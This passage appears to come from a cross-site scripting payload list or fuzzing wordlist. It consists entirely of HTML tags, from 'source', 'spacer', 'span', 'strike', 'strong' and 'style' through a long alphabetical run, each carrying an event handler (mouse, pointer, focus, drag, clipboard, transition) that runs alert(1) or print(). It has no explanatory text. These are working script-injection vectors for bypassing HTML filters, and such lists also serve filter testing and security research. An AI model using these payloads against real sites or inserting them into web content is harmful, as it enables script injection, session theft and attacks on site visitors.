<source onmousemove="alert(1)" style=display:block>test</source>
<source onmouseout="alert(1)" style=display:block>test</source>
<source onmouseover="alert(1)" style=display:block>test</source>
<source onmouseup="alert(1)" style=display:block>test</source>
<source onmousewheel=alert(1) style=display:block>requires scrolling
<source onpaste="alert(1)" contenteditable>test</source>
<source onpointerdown=alert(1) style=display:block>XSS</source>
<source onpointerenter=alert(1) style=display:block>XSS</source>
<source onpointerleave=alert(1) style=display:block>XSS</source>
<source onpointermove=alert(1) style=display:block>XSS</source>
<source onpointerout=alert(1) style=display:block>XSS</source>
<source onpointerover=alert(1) style=display:block>XSS</source>
<source onpointerrawupdate=alert(1) style=display:block>XSS</source>
<source onpointerup=alert(1) style=display:block>XSS</source>
<source onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></source>
<spacer contenteditable onbeforeinput=alert(1)>test
<spacer draggable="true" ondrag="alert(1)" style=display:block>test</spacer>
<spacer draggable="true" ondragend="alert(1)" style=display:block>test</spacer>
<spacer draggable="true" ondragenter="alert(1)" style=display:block>test</spacer>
<spacer draggable="true" ondragleave="alert(1)" style=display:block>test</spacer>
<spacer draggable="true" ondragstart="alert(1)" style=display:block>test</spacer>
<spacer id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></spacer>
<spacer id=x tabindex=1 onfocus=alert(1)></spacer>
<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>
<spacer onafterscriptexecute=alert(1)><script>1</script>
<spacer onbeforecopy="alert(1)" contenteditable>test</spacer>
<spacer onbeforecut="alert(1)" contenteditable>test</spacer>
<spacer onbeforescriptexecute=alert(1)><script>1</script>
<spacer onblur=alert(1) id=x tabindex=1 style=display:block>test</spacer><input value=clickme>
<spacer onclick="alert(1)" style=display:block>test</spacer>
<spacer oncontextmenu="alert(1)" style=display:block>test</spacer>
<spacer oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<spacer oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<spacer ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</spacer>
<spacer onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</spacer><input value=clickme>
<spacer onkeydown="alert(1)" contenteditable style=display:block>test</spacer>
<spacer onkeypress="alert(1)" contenteditable style=display:block>test</spacer>
<spacer onkeyup="alert(1)" contenteditable style=display:block>test</spacer>
<spacer onmousedown="alert(1)" style=display:block>test</spacer>
<spacer onmouseenter="alert(1)" style=display:block>test</spacer>
<spacer onmouseleave="alert(1)" style=display:block>test</spacer>
<spacer onmousemove="alert(1)" style=display:block>test</spacer>
<spacer onmouseout="alert(1)" style=display:block>test</spacer>
<spacer onmouseover="alert(1)" style=display:block>test</spacer>
<spacer onmouseup="alert(1)" style=display:block>test</spacer>
<spacer onmousewheel=alert(1) style=display:block>requires scrolling
<spacer onpaste="alert(1)" contenteditable>test</spacer>
<spacer onpointerdown=alert(1) style=display:block>XSS</spacer>
<spacer onpointerenter=alert(1) style=display:block>XSS</spacer>
<spacer onpointerleave=alert(1) style=display:block>XSS</spacer>
<spacer onpointermove=alert(1) style=display:block>XSS</spacer>
<spacer onpointerout=alert(1) style=display:block>XSS</spacer>
<spacer onpointerover=alert(1) style=display:block>XSS</spacer>
<spacer onpointerrawupdate=alert(1) style=display:block>XSS</spacer>
<spacer onpointerup=alert(1) style=display:block>XSS</spacer>
<spacer onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></spacer>
<span contenteditable onbeforeinput=alert(1)>test
<span draggable="true" ondrag="alert(1)" style=display:block>test</span>
<span draggable="true" ondragend="alert(1)" style=display:block>test</span>
<span draggable="true" ondragenter="alert(1)" style=display:block>test</span>
<span draggable="true" ondragleave="alert(1)" style=display:block>test</span>
<span draggable="true" ondragstart="alert(1)" style=display:block>test</span>
<span id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></span>
<span id=x tabindex=1 onfocus=alert(1)></span>
<span id=x tabindex=1 onfocusin=alert(1)></span>
<span onafterscriptexecute=alert(1)><script>1</script>
<span onbeforecopy="alert(1)" contenteditable>test</span>
<span onbeforecut="alert(1)" contenteditable>test</span>
<span onbeforescriptexecute=alert(1)><script>1</script>
<span onblur=alert(1) id=x tabindex=1 style=display:block>test</span><input value=clickme>
<span onclick="alert(1)" style=display:block>test</span>
<span oncontextmenu="alert(1)" style=display:block>test</span>
<span oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<span oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<span ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</span>
<span onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</span><input value=clickme>
<span onkeydown="alert(1)" contenteditable style=display:block>test</span>
<span onkeypress="alert(1)" contenteditable style=display:block>test</span>
<span onkeyup="alert(1)" contenteditable style=display:block>test</span>
<span onmousedown="alert(1)" style=display:block>test</span>
<span onmouseenter="alert(1)" style=display:block>test</span>
<span onmouseleave="alert(1)" style=display:block>test</span>
<span onmousemove="alert(1)" style=display:block>test</span>
<span onmouseout="alert(1)" style=display:block>test</span>
<span onmouseover="alert(1)" style=display:block>test</span>
<span onmouseup="alert(1)" style=display:block>test</span>
<span onmousewheel=alert(1) style=display:block>requires scrolling
<span onpaste="alert(1)" contenteditable>test</span>
<span onpointerdown=alert(1) style=display:block>XSS</span>
<span onpointerenter=alert(1) style=display:block>XSS</span>
<span onpointerleave=alert(1) style=display:block>XSS</span>
<span onpointermove=alert(1) style=display:block>XSS</span>
<span onpointerout=alert(1) style=display:block>XSS</span>
<span onpointerover=alert(1) style=display:block>XSS</span>
<span onpointerrawupdate=alert(1) style=display:block>XSS</span>
<span onpointerup=alert(1) style=display:block>XSS</span>
<span onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></span>
<strike contenteditable onbeforeinput=alert(1)>test
<strike draggable="true" ondrag="alert(1)" style=display:block>test</strike>
<strike draggable="true" ondragend="alert(1)" style=display:block>test</strike>
<strike draggable="true" ondragenter="alert(1)" style=display:block>test</strike>
<strike draggable="true" ondragleave="alert(1)" style=display:block>test</strike>
<strike draggable="true" ondragstart="alert(1)" style=display:block>test</strike>
<strike id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></strike>
<strike id=x tabindex=1 onfocus=alert(1)></strike>
<strike id=x tabindex=1 onfocusin=alert(1)></strike>
<strike onafterscriptexecute=alert(1)><script>1</script>
<strike onbeforecopy="alert(1)" contenteditable>test</strike>
<strike onbeforecut="alert(1)" contenteditable>test</strike>
<strike onbeforescriptexecute=alert(1)><script>1</script>
<strike onblur=alert(1) id=x tabindex=1 style=display:block>test</strike><input value=clickme>
<strike onclick="alert(1)" style=display:block>test</strike>
<strike oncontextmenu="alert(1)" style=display:block>test</strike>
<strike oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<strike oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<strike ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</strike>
<strike onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</strike><input value=clickme>
<strike onkeydown="alert(1)" contenteditable style=display:block>test</strike>
<strike onkeypress="alert(1)" contenteditable style=display:block>test</strike>
<strike onkeyup="alert(1)" contenteditable style=display:block>test</strike>
<strike onmousedown="alert(1)" style=display:block>test</strike>
<strike onmouseenter="alert(1)" style=display:block>test</strike>
<strike onmouseleave="alert(1)" style=display:block>test</strike>
<strike onmousemove="alert(1)" style=display:block>test</strike>
<strike onmouseout="alert(1)" style=display:block>test</strike>
<strike onmouseover="alert(1)" style=display:block>test</strike>
<strike onmouseup="alert(1)" style=display:block>test</strike>
<strike onmousewheel=alert(1) style=display:block>requires scrolling
<strike onpaste="alert(1)" contenteditable>test</strike>
<strike onpointerdown=alert(1) style=display:block>XSS</strike>
<strike onpointerenter=alert(1) style=display:block>XSS</strike>
<strike onpointerleave=alert(1) style=display:block>XSS</strike>
<strike onpointermove=alert(1) style=display:block>XSS</strike>
<strike onpointerout=alert(1) style=display:block>XSS</strike>
<strike onpointerover=alert(1) style=display:block>XSS</strike>
<strike onpointerrawupdate=alert(1) style=display:block>XSS</strike>
<strike onpointerup=alert(1) style=display:block>XSS</strike>
<strike onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></strike>
<strong contenteditable onbeforeinput=alert(1)>test
<strong draggable="true" ondrag="alert(1)" style=display:block>test</strong>
<strong draggable="true" ondragend="alert(1)" style=display:block>test</strong>
<strong draggable="true" ondragenter="alert(1)" style=display:block>test</strong>
<strong draggable="true" ondragleave="alert(1)" style=display:block>test</strong>
<strong draggable="true" ondragstart="alert(1)" style=display:block>test</strong>
<strong id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></strong>
<strong id=x tabindex=1 onfocus=alert(1)></strong>
<strong id=x tabindex=1 onfocusin=alert(1)></strong>
<strong onafterscriptexecute=alert(1)><script>1</script>
<strong onbeforecopy="alert(1)" contenteditable>test</strong>
<strong onbeforecut="alert(1)" contenteditable>test</strong>
<strong onbeforescriptexecute=alert(1)><script>1</script>
<strong onblur=alert(1) id=x tabindex=1 style=display:block>test</strong><input value=clickme>
<strong onclick="alert(1)" style=display:block>test</strong>
<strong oncontextmenu="alert(1)" style=display:block>test</strong>
<strong oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<strong oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<strong ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</strong>
<strong onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</strong><input value=clickme>
<strong onkeydown="alert(1)" contenteditable style=display:block>test</strong>
<strong onkeypress="alert(1)" contenteditable style=display:block>test</strong>
<strong onkeyup="alert(1)" contenteditable style=display:block>test</strong>
<strong onmousedown="alert(1)" style=display:block>test</strong>
<strong onmouseenter="alert(1)" style=display:block>test</strong>
<strong onmouseleave="alert(1)" style=display:block>test</strong>
<strong onmousemove="alert(1)" style=display:block>test</strong>
<strong onmouseout="alert(1)" style=display:block>test</strong>
<strong onmouseover="alert(1)" style=display:block>test</strong>
<strong onmouseup="alert(1)" style=display:block>test</strong>
<strong onmousewheel=alert(1) style=display:block>requires scrolling
<strong onpaste="alert(1)" contenteditable>test</strong>
<strong onpointerdown=alert(1) style=display:block>XSS</strong>
<strong onpointerenter=alert(1) style=display:block>XSS</strong>
<strong onpointerleave=alert(1) style=display:block>XSS</strong>
<strong onpointermove=alert(1) style=display:block>XSS</strong>
<strong onpointerout=alert(1) style=display:block>XSS</strong>
<strong onpointerover=alert(1) style=display:block>XSS</strong>
<strong onpointerrawupdate=alert(1) style=display:block>XSS</strong>
<strong onpointerup=alert(1) style=display:block>XSS</strong>
<strong onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></strong>
<style contenteditable onbeforeinput=alert(1)>test
<style draggable="true" ondrag="alert(1)" style=display:block>test</style>
<style draggable="true" ondragend="alert(1)" style=display:block>test</style>
<style draggable="true" ondragenter="alert(1)" style=display:block>test</style>
<style draggable="true" ondragleave="alert(1)" style=display:block>test</style>
<style draggable="true" ondragstart="alert(1)" style=display:block>test</style>
<style id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></style>
<style id=x tabindex=1 onfocus=alert(1) style=display:block></style>
<style id=x tabindex=1 onfocusin=alert(1) style=display:block></style>
<style onafterscriptexecute=alert(1)><script>1</script>
<style onbeforecopy="alert(1)" contenteditable style=display:block>test</style>
<style onbeforecut="alert(1)" contenteditable style=display:block>test</style>
<style onbeforescriptexecute=alert(1)><script>1</script>
<style onblur=alert(1) id=x tabindex=1 style=display:block>test</style><input value=clickme>
<style onclick="alert(1)" style=display:block>test</style>
<style oncontextmenu="alert(1)" style=display:block>test</style>
<style oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<style oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<style ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</style>
<style onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</style><input value=clickme>
<style onkeydown="alert(1)" contenteditable style=display:block>test</style>
<style onkeypress="alert(1)" contenteditable style=display:block>test</style>
<style onkeyup="alert(1)" contenteditable style=display:block>test</style>
<style onload=alert(1)></style>
<style onmousedown="alert(1)" style=display:block>test</style>
<style onmouseenter="alert(1)" style=display:block>test</style>
<style onmouseleave="alert(1)" style=display:block>test</style>
<style onmousemove="alert(1)" style=display:block>test</style>
<style onmouseout="alert(1)" style=display:block>test</style>
<style onmouseover="alert(1)" style=display:block>test</style>
<style onmouseup="alert(1)" style=display:block>test</style>
<style onmousewheel=alert(1) style=display:block>requires scrolling
<style onpaste="alert(1)" contenteditable style=display:block style=display:block>test</style>
<style onpointerdown=alert(1) style=display:block>XSS</style>
<style onpointerenter=alert(1) style=display:block>XSS</style>
<style onpointerleave=alert(1) style=display:block>XSS</style>
<style onpointermove=alert(1) style=display:block>XSS</style>
<style onpointerout=alert(1) style=display:block>XSS</style>
<style onpointerover=alert(1) style=display:block>XSS</style>
<style onpointerrawupdate=alert(1) style=display:block>XSS</style>
<style onpointerup=alert(1) style=display:block>XSS</style>
<style onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></style>
<style>:target {color: red;}</style><a id=x style="transition:color 10s" ontransitioncancel=print()></a>
<style>:target {color: red;}</style><a2 id=x style="transition:color 10s" ontransitioncancel=print()></a2>
<style>:target {color: red;}</style><abbr id=x style="transition:color 10s" ontransitioncancel=print()></abbr>
<style>:target {color: red;}</style><acronym id=x style="transition:color 10s" ontransitioncancel=print()></acronym>
<style>:target {color: red;}</style><address id=x style="transition:color 10s" ontransitioncancel=print()></address>
<style>:target {color: red;}</style><animate id=x style="transition:color 10s" ontransitioncancel=print()></animate>
<style>:target {color: red;}</style><animatemotion id=x style="transition:color 10s" ontransitioncancel=print()></animatemotion>
<style>:target {color: red;}</style><animatetransform id=x style="transition:color 10s" ontransitioncancel=print()></animatetransform>
<style>:target {color: red;}</style><applet id=x style="transition:color 10s" ontransitioncancel=print()></applet>
<style>:target {color: red;}</style><area id=x style="transition:color 10s" ontransitioncancel=print()></area>
<style>:target {color: red;}</style><article id=x style="transition:color 10s" ontransitioncancel=print()></article>
<style>:target {color: red;}</style><aside id=x style="transition:color 10s" ontransitioncancel=print()></aside>
<style>:target {color: red;}</style><audio id=x style="transition:color 10s" ontransitioncancel=print()></audio>
<style>:target {color: red;}</style><audio2 id=x style="transition:color 10s" ontransitioncancel=print()></audio2>
<style>:target {color: red;}</style><b id=x style="transition:color 10s" ontransitioncancel=print()></b>
<style>:target {color: red;}</style><bdi id=x style="transition:color 10s" ontransitioncancel=print()></bdi>
<style>:target {color: red;}</style><bdo id=x style="transition:color 10s" ontransitioncancel=print()></bdo>
<style>:target {color: red;}</style><big id=x style="transition:color 10s" ontransitioncancel=print()></big>
<style>:target {color: red;}</style><blink id=x style="transition:color 10s" ontransitioncancel=print()></blink>
<style>:target {color: red;}</style><blockquote id=x style="transition:color 10s" ontransitioncancel=print()></blockquote>
<style>:target {color: red;}</style><body id=x style="transition:color 10s" ontransitioncancel=print()></body>
<style>:target {color: red;}</style><br id=x style="transition:color 10s" ontransitioncancel=print()></br>
<style>:target {color: red;}</style><button id=x style="transition:color 10s" ontransitioncancel=print()></button>
<style>:target {color: red;}</style><canvas id=x style="transition:color 10s" ontransitioncancel=print()></canvas>
<style>:target {color: red;}</style><caption id=x style="transition:color 10s" ontransitioncancel=print()></caption>
<style>:target {color: red;}</style><center id=x style="transition:color 10s" ontransitioncancel=print()></center>
<style>:target {color: red;}</style><cite id=x style="transition:color 10s" ontransitioncancel=print()></cite>
<style>:target {color: red;}</style><code id=x style="transition:color 10s" ontransitioncancel=print()></code>
<style>:target {color: red;}</style><col id=x style="transition:color 10s" ontransitioncancel=print()></col>
<style>:target {color: red;}</style><colgroup id=x style="transition:color 10s" ontransitioncancel=print()></colgroup>
<style>:target {color: red;}</style><command id=x style="transition:color 10s" ontransitioncancel=print()></command>
<style>:target {color: red;}</style><content id=x style="transition:color 10s" ontransitioncancel=print()></content>
<style>:target {color: red;}</style><custom tags id=x style="transition:color 10s" ontransitioncancel=print()></custom tags>
<style>:target {color: red;}</style><data id=x style="transition:color 10s" ontransitioncancel=print()></data>
<style>:target {color: red;}</style><datalist id=x style="transition:color 10s" ontransitioncancel=print()></datalist>
<style>:target {color: red;}</style><dd id=x style="transition:color 10s" ontransitioncancel=print()></dd>
<style>:target {color: red;}</style><del id=x style="transition:color 10s" ontransitioncancel=print()></del>
<style>:target {color: red;}</style><details id=x style="transition:color 10s" ontransitioncancel=print()></details>
<style>:target {color: red;}</style><dfn id=x style="transition:color 10s" ontransitioncancel=print()></dfn>
<style>:target {color: red;}</style><dialog id=x style="transition:color 10s" ontransitioncancel=print()></dialog>
<style>:target {color: red;}</style><dir id=x style="transition:color 10s" ontransitioncancel=print()></dir>
<style>:target {color: red;}</style><div id=x style="transition:color 10s" ontransitioncancel=print()></div>
<style>:target {color: red;}</style><dl id=x style="transition:color 10s" ontransitioncancel=print()></dl>
<style>:target {color: red;}</style><dt id=x style="transition:color 10s" ontransitioncancel=print()></dt>
<style>:target {color: red;}</style><element id=x style="transition:color 10s" ontransitioncancel=print()></element>
<style>:target {color: red;}</style><em id=x style="transition:color 10s" ontransitioncancel=print()></em>
<style>:target {color: red;}</style><embed id=x style="transition:color 10s" ontransitioncancel=print()></embed>
<style>:target {color: red;}</style><fieldset id=x style="transition:color 10s" ontransitioncancel=print()></fieldset>
<style>:target {color: red;}</style><figcaption id=x style="transition:color 10s" ontransitioncancel=print()></figcaption>
<style>:target {color: red;}</style><figure id=x style="transition:color 10s" ontransitioncancel=print()></figure>
<style>:target {color: red;}</style><font id=x style="transition:color 10s" ontransitioncancel=print()></font>
<style>:target {color: red;}</style><footer id=x style="transition:color 10s" ontransitioncancel=print()></footer>
<style>:target {color: red;}</style><form id=x style="transition:color 10s" ontransitioncancel=print()></form>
<style>:target {color: red;}</style><frame id=x style="transition:color 10s" ontransitioncancel=print()></frame>
<style>:target {color: red;}</style><frameset id=x style="transition:color 10s" ontransitioncancel=print()></frameset>
<style>:target {color: red;}</style><h1 id=x style="transition:color 10s" ontransitioncancel=print()></h1>
<style>:target {color: red;}</style><head id=x style="transition:color 10s" ontransitioncancel=print()></head>
<style>:target {color: red;}</style><header id=x style="transition:color 10s" ontransitioncancel=print()></header>
<style>:target {color: red;}</style><hgroup id=x style="transition:color 10s" ontransitioncancel=print()></hgroup>
<style>:target {color: red;}</style><hr id=x style="transition:color 10s" ontransitioncancel=print()></hr>
<style>:target {color: red;}</style><html id=x style="transition:color 10s" ontransitioncancel=print()></html>
<style>:target {color: red;}</style><i id=x style="transition:color 10s" ontransitioncancel=print()></i>
<style>:target {color: red;}</style><iframe id=x style="transition:color 10s" ontransitioncancel=print()></iframe>
<style>:target {color: red;}</style><iframe2 id=x style="transition:color 10s" ontransitioncancel=print()></iframe2>
<style>:target {color: red;}</style><image id=x style="transition:color 10s" ontransitioncancel=print()></image>
<style>:target {color: red;}</style><image2 id=x style="transition:color 10s" ontransitioncancel=print()></image2>
<style>:target {color: red;}</style><image3 id=x style="transition:color 10s" ontransitioncancel=print()></image3>
<style>:target {color: red;}</style><img id=x style="transition:color 10s" ontransitioncancel=print()></img>
<style>:target {color: red;}</style><img2 id=x style="transition:color 10s" ontransitioncancel=print()></img2>
<style>:target {color: red;}</style><input id=x style="transition:color 10s" ontransitioncancel=print()></input>
<style>:target {color: red;}</style><input2 id=x style="transition:color 10s" ontransitioncancel=print()></input2>
<style>:target {color: red;}</style><input3 id=x style="transition:color 10s" ontransitioncancel=print()></input3>
<style>:target {color: red;}</style><input4 id=x style="transition:color 10s" ontransitioncancel=print()></input4>
<style>:target {color: red;}</style><ins id=x style="transition:color 10s" ontransitioncancel=print()></ins>
<style>:target {color: red;}</style><kbd id=x style="transition:color 10s" ontransitioncancel=print()></kbd>
<style>:target {color: red;}</style><keygen id=x style="transition:color 10s" ontransitioncancel=print()></keygen>
<style>:target {color: red;}</style><label id=x style="transition:color 10s" ontransitioncancel=print()></label>
<style>:target {color: red;}</style><legend id=x style="transition:color 10s" ontransitioncancel=print()></legend>
<style>:target {color: red;}</style><li id=x style="transition:color 10s" ontransitioncancel=print()></li>
<style>:target {color: red;}</style><link id=x style="transition:color 10s" ontransitioncancel=print()></link>
<style>:target {color: red;}</style><listing id=x style="transition:color 10s" ontransitioncancel=print()></listing>
<style>:target {color: red;}</style><main id=x style="transition:color 10s" ontransitioncancel=print()></main>
<style>:target {color: red;}</style><map id=x style="transition:color 10s" ontransitioncancel=print()></map>
<style>:target {color: red;}</style><mark id=x style="transition:color 10s" ontransitioncancel=print()></mark>
<style>:target {color: red;}</style><marquee id=x style="transition:color 10s" ontransitioncancel=print()></marquee>
<style>:target {color: red;}</style><menu id=x style="transition:color 10s" ontransitioncancel=print()></menu>
<style>:target {color: red;}</style><menuitem id=x style="transition:color 10s" ontransitioncancel=print()></menuitem>
<style>:target {color: red;}</style><meta id=x style="transition:color 10s" ontransitioncancel=print()></meta>
<style>:target {color: red;}</style><meter id=x style="transition:color 10s" ontransitioncancel=print()></meter>
<style>:target {color: red;}</style><multicol id=x style="transition:color 10s" ontransitioncancel=print()></multicol>
<style>:target {color: red;}</style><nav id=x style="transition:color 10s" ontransitioncancel=print()></nav>
<style>:target {color: red;}</style><nextid id=x style="transition:color 10s" ontransitioncancel=print()></nextid>
<style>:target {color: red;}</style><nobr id=x style="transition:color 10s" ontransitioncancel=print()></nobr>
<style>:target {color: red;}</style><noembed id=x style="transition:color 10s" ontransitioncancel=print()></noembed>
<style>:target {color: red;}</style><noframes id=x style="transition:color 10s" ontransitioncancel=print()></noframes>
<style>:target {color: red;}</style><noscript id=x style="transition:color 10s" ontransitioncancel=print()></noscript>
<style>:target {color: red;}</style><object id=x style="transition:color 10s" ontransitioncancel=print()></object>
<style>:target {color: red;}</style><ol id=x style="transition:color 10s" ontransitioncancel=print()></ol>
<style>:target {color: red;}</style><optgroup id=x style="transition:color 10s" ontransitioncancel=print()></optgroup>
<style>:target {color: red;}</style><option id=x style="transition:color 10s" ontransitioncancel=print()></option>
<style>:target {color: red;}</style><output id=x style="transition:color 10s" ontransitioncancel=print()></output>
<style>:target {color: red;}</style><p id=x style="transition:color 10s" ontransitioncancel=print()></p>
<style>:target {color: red;}</style><param id=x style="transition:color 10s" ontransitioncancel=print()></param>
<style>:target {color: red;}</style><picture id=x style="transition:color 10s" ontransitioncancel=print()></picture>
<style>:target {color: red;}</style><plaintext id=x style="transition:color 10s" ontransitioncancel=print()></plaintext>
<style>:target {color: red;}</style><pre id=x style="transition:color 10s" ontransitioncancel=print()></pre>
<style>:target {color: red;}</style><progress id=x style="transition:color 10s" ontransitioncancel=print()></progress>
<style>:target {color: red;}</style><q id=x style="transition:color 10s" ontransitioncancel=print()></q>
<style>:target {color: red;}</style><rb id=x style="transition:color 10s" ontransitioncancel=print()></rb>
<style>:target {color: red;}</style><rp id=x style="transition:color 10s" ontransitioncancel=print()></rp>
<style>:target {color: red;}</style><rt id=x style="transition:color 10s" ontransitioncancel=print()></rt>
<style>:target {color: red;}</style><rtc id=x style="transition:color 10s" ontransitioncancel=print()></rtc>
<style>:target {color: red;}</style><ruby id=x style="transition:color 10s" ontransitioncancel=print()></ruby>
<style>:target {color: red;}</style><s id=x style="transition:color 10s" ontransitioncancel=print()></s>
<style>:target {color: red;}</style><samp id=x style="transition:color 10s" ontransitioncancel=print()></samp>
<style>:target {color: red;}</style><script id=x style="transition:color 10s" ontransitioncancel=print()></script>
<style>:target {color: red;}</style><section id=x style="transition:color 10s" ontransitioncancel=print()></section>
<style>:target {color: red;}</style><select id=x style="transition:color 10s" ontransitioncancel=print()></select>
<style>:target {color: red;}</style><set id=x style="transition:color 10s" ontransitioncancel=print()></set>
<style>:target {color: red;}</style><shadow id=x style="transition:color 10s" ontransitioncancel=print()></shadow>
<style>:target {color: red;}</style><slot id=x style="transition:color 10s" ontransitioncancel=print()></slot>
<style>:target {color: red;}</style><small id=x style="transition:color 10s" ontransitioncancel=print()></small>
<style>:target {color: red;}</style><source id=x style="transition:color 10s" ontransitioncancel=print()></source>
<style>:target {color: red;}</style><spacer id=x style="transition:color 10s" ontransitioncancel=print()></spacer>
<style>:target {color: red;}</style><span id=x style="transition:color 10s" ontransitioncancel=print()></span>
<style>:target {color: red;}</style><strike id=x style="transition:color 10s" ontransitioncancel=print()></strike>
<style>:target {color: red;}</style><strong id=x style="transition:color 10s" ontransitioncancel=print()></strong>
<style>:target {color: red;}</style><style id=x style="transition:color 10s" ontransitioncancel=print()></style>
<style>:target {color: red;}</style><sub id=x style="transition:color 10s" ontransitioncancel=print()></sub>
<style>:target {color: red;}</style><summary id=x style="transition:color 10s" ontransitioncancel=print()></summary>
<style>:target {color: red;}</style><sup id=x style="transition:color 10s" ontransitioncancel=print()></sup>
<style>:target {color: red;}</style><svg id=x style="transition:color 10s" ontransitioncancel=print()></svg>
<style>:target {color: red;}</style><table id=x style="transition:color 10s" ontransitioncancel=print()></table>
<style>:target {color: red;}</style><tbody id=x style="transition:color 10s" ontransitioncancel=print()></tbody>
<style>:target {color: red;}</style><td id=x style="transition:color 10s" ontransitioncancel=print()></td>
<style>:target {color: red;}</style><template id=x style="transition:color 10s" ontransitioncancel=print()></template>
<style>:target {color: red;}</style><textarea id=x style="transition:color 10s" ontransitioncancel=print()></textarea>
<style>:target {color: red;}</style><tfoot id=x style="transition:color 10s" ontransitioncancel=print()></tfoot>
<style>:target {color: red;}</style><th id=x style="transition:color 10s" ontransitioncancel=print()></th>
<style>:target {color: red;}</style><thead id=x style="transition:color 10s" ontransitioncancel=print()></thead>
<style>:target {color: red;}</style><time id=x style="transition:color 10s" ontransitioncancel=print()></time>
<style>:target {color: red;}</style><title id=x style="transition:color 10s" ontransitioncancel=print()></title>
<style>:target {color: red;}</style><tr id=x style="transition:color 10s" ontransitioncancel=print()></tr>
<style>:target {color: red;}</style><track id=x style="transition:color 10s" ontransitioncancel=print()></track>
<style>:target {color: red;}</style><tt id=x style="transition:color 10s" ontransitioncancel=print()></tt>
<style>:target {color: red;}</style><u id=x style="transition:color 10s" ontransitioncancel=print()></u>
<style>:target {color: red;}</style><ul id=x style="transition:color 10s" ontransitioncancel=print()></ul>
<style>:target {color: red;}</style><var id=x style="transition:color 10s" ontransitioncancel=print()></var>
<style>:target {color: red;}</style><video id=x style="transition:color 10s" ontransitioncancel=print()></video>
<style>:target {color: red;}</style><video2 id=x style="transition:color 10s" ontransitioncancel=print()></video2>
<style>:target {color: red;}</style><wbr id=x style="transition:color 10s" ontransitioncancel=print()></wbr>
<style>:target {color: red;}</style><xmp id=x style="transition:color 10s" ontransitioncancel=print()></xmp>
<style>:target {color:red;}</style><a id=x style="transition:color 1s" ontransitionstart=alert(1)></a>
<style>:target {color:red;}</style><a id=x style="transition:color 1s" onwebkittransitionend=alert(1)></a>
<style>:target {color:red;}</style><a2 id=x style="transition:color 1s" ontransitionstart=alert(1)></a2>
<style>:target {color:red;}</style><a2 id=x style="transition:color 1s" onwebkittransitionend=alert(1)></a2>
<style>:target {color:red;}</style><abbr id=x style="transition:color 1s" ontransitionstart=alert(1)></abbr>
<style>:target {color:red;}</style><abbr id=x style="transition:color 1s" onwebkittransitionend=alert(1)></abbr>
<style>:target {color:red;}</style><acronym id=x style="transition:color 1s" ontransitionstart=alert(1)></acronym>
<style>:target {color:red;}</style><acronym id=x style="transition:color 1s" onwebkittransitionend=alert(1)></acronym>
<style>:target {color:red;}</style><address id=x style="transition:color 1s" ontransitionstart=alert(1)></address>
<style>:target {color:red;}</style><address id=x style="transition:color 1s" onwebkittransitionend=alert(1)></address>
<style>:target {color:red;}</style><animate id=x style="transition:color 1s" ontransitionstart=alert(1)></animate>
<style>:target {color:red;}</style><animate id=x style="transition:color 1s" onwebkittransitionend=alert(1)></animate>
<style>:target {color:red;}</style><animatemotion id=x style="transition:color 1s" ontransitionstart=alert(1)></animatemotion>
<style>:target {color:red;}</style><animatemotion id=x style="transition:color 1s" onwebkittransitionend=alert(1)></animatemotion>
<style>:target {color:red;}</style><animatetransform id=x style="transition:color 1s" ontransitionstart=alert(1)></animatetransform>
<style>:target {color:red;}</style><animatetransform id=x style="transition:color 1s" onwebkittransitionend=alert(1)></animatetransform>
<style>:target {color:red;}</style><applet id=x style="transition:color 1s" ontransitionstart=alert(1)></applet>
<style>:target {color:red;}</style><applet id=x style="transition:color 1s" onwebkittransitionend=alert(1)></applet>
<style>:target {color:red;}</style><area id=x style="transition:color 1s" ontransitionstart=alert(1)></area>
